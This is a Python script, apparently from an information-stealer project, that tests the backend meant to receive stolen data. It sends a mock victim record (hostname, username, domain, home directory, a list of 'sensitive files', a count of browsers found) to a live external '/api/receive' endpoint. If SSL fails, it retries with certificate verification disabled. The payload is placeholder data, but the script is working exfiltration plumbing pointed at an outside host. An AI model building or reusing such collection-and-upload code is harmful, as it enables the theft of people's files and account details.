#!/usr/bin/env python3
"""Test script to debug backend connection"""

import requests
import json
from datetime import datetime

# Test simple payload
test_data = {
    'timestamp': datetime.now().isoformat(),
    'hostname': 'test-pc',
    'os': 'Windows',
    'os_version': '10.0.19041',
    'username': 'testuser',
    'computer_name': 'TEST-PC',
    'user_domain': 'WORKGROUP',
    'home_directory': 'C:\\Users\\testuser',
    'data_collected': {
        'sensitive_files': [
            {
                'path': 'C:\\test\\file.txt',
                'name': 'file.txt',
                'extension': '.txt',
                'size_bytes': 100,
                'modified_time': datetime.now().isoformat(),
                'created_time': datetime.now().isoformat(),
            }
        ]
    },
    'summary': {
        'total_sensitive_files': 1,
        'browsers_found': 0,
    }
}

url = 'https://clownfish-app-5kdkx.ondigitalocean.app/api/receive?type=test'
headers = {'Content-Type': 'application/json'}

print(f"[*] Testing backend connection...")
print(f"[*] URL: {url}")
print(f"[*] Data size: {len(json.dumps(test_data))} bytes")

try:
    # Try with SSL verification
    print("\n[*] Attempting with SSL verification...")
    response = requests.post(
        url,
        json=test_data,
        headers=headers,
        timeout=10,
        verify=True
    )
    print(f"[*] Status: {response.status_code}")
    print(f"[*] Response: {response.text}")
    
except requests.exceptions.SSLError as e:
    print(f"[!] SSL Error: {e}")
    print("\n[*] Retrying without SSL verification...")
    try:
        response = requests.post(
            url,
            json=test_data,
            headers=headers,
            timeout=10,
            verify=False
        )
        print(f"[*] Status: {response.status_code}")
        print(f"[*] Response: {response.text}")
    except Exception as e2:
        print(f"[!] Error: {e2}")

except Exception as e:
    print(f"[!] Error: {e}")
